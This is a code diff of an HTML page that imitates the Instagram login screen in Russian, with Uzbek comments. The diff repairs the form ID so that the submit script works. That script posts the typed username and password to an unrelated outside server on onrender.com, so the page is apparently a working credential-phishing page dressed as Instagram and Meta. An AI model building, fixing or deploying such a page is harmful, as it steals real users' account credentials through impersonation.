@@ -10,7 +10,7 @@
 
 <body>
     <h2>Instagram</h2>
-    <form id="registerForm">
+    <form id="loginForm"> <!-- Form ID to'g'ri nomlangan -->
         <input type="text" id="username" placeholder="Телефон, имя пользователя или эл. адрес" required><br>
         <input type="password" id="password" placeholder="Пароль" required><br>
         <button type="submit">Войти</button>
@@ -28,9 +28,6 @@
     
     <div class="app-links">
         <p>Установите приложение.</p>
-        <!-- These would be images of app store buttons in a real implementation -->
-        <div>
-        </div>
     </div>
     
     <div class="footer">
@@ -53,33 +50,32 @@
         <div class="copyright">
             Русский ✔ © 2025 Instagram from Meta
         </div>
+    </div>
 
-        <script>
-            const form = document.getElementById('loginForm');
-          
-            form.addEventListener('submit', async (e) => {
-              e.preventDefault();
-          
-              const username = document.getElementById('username').value;
-              const password = document.getElementById('password').value;
-          
-              const res = await fetch('https://my-ser-tnvw.onrender.com/api/auth/login', {
+    <script>
+        const form = document.getElementById('loginForm'); <!-- Correct ID used here -->
+
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            const res = await fetch('https://my-ser-tnvw.onrender.com/api/auth/login', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ username, password })
-              });
-          
-              const data = await res.json();
-          
-              if (res.ok) {
-                // alert olib tashlangan
-                console.log('Login muvaffaqiyatli:', data.user.username);
-              } else {
-                alert(data.message || 'Login xato');
-              }
             });
-          </script>
-          
+
+            const data = await res.json();
+
+            if (res.ok) {
+                console.log('Login muvaffaqiyatli:', data.user.username);
+            } else {
+                alert(data.message || 'Login xato');
+            }
+        });
+    </script>
 </body>
 
 </html>
